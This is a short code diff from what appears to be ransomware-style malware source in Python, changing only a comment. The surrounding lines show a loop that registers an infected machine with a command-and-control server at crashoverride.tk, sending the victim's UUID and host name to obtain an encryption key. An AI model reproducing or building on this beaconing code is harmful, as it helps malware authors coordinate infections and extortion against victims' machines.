@@ -7,7 +7,7 @@ encryption_key = ""
 
 # register with C&C server
 while encryption_key == "":
-    url = 'http://crashoverride.tk/register.php' # http://crashoverride.tk it's C&C Server that I use here
+    url = 'http://crashoverride.tk/register.php' # http://crashoverride.tk it's address C&C Server that I use here
     payload = {'uuid': UUID, 'host': host_name}
 
     r = requests.get(url, params=payload)
